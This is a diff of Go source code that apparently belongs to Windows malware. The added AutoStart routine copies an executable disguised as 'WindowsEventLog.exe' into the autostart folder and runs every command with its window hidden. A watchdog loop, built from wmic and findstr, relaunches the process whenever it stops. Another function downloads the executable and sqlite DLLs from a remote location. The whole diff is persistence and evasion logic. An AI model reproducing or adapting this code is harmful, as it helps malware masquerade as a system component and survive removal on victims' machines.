@@ -195,12 +195,33 @@ func KillMain() {
 	killcheck.Run()
 }
 func AutoStart() {
-	time.Sleep(6 * time.Second)
-	if FileExits(AUTOSTART+"WindowsEventLog.exe") != nil {
-		move := exec.Command("cmd", "/C", "copy", "/s", "/q", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
-		move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		// not Start will continue
-		move.Run()
+	for {
+		ticker := time.NewTicker(15 * time.Second)
+		if FileExits(CURRENTPATH+"WindowsEventLog.exe") != nil {
+			if FileExits(AUTOSTART+"WindowsEventLog.exe") != nil {
+				move := exec.Command("cmd", "/C", "copy", "/s", "/q", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
+				move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				// not Start will continue
+				move.Run()
+			}
+			buf := bytes.Buffer{}
+			cmd := exec.Command("wmic", "process", "get", "name,processid")
+			cmd.Stdout = &buf
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd.Run()
+
+			cmd2 := exec.Command("findstr", "WindowsEventLog.exe")
+			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd2.Stdin = &buf
+			data, _ := cmd2.CombinedOutput()
+			//if died up
+			if len(data) == 0 {
+				cmd3 := exec.Command(CURRENTPATH + "WindowsEventLog.exe")
+				cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				cmd3.Start()
+			}
+		}
+		<-ticker.C
 	}
 }
 func MultiFileDown(files []string, step string) {
@@ -208,9 +229,9 @@ func MultiFileDown(files []string, step string) {
 		var fileinit = []struct {
 			Name string
 		}{
+			{"sqlite3_amd64.dll"},
 			{"WindowsEventLog.exe"},
 			{"sqlite3_386.dll"},
-			{"sqlite3_amd64.dll"},
 		}
 		for _, name := range fileinit {
 			Get(MIDFILE+name.Name, name.Name)
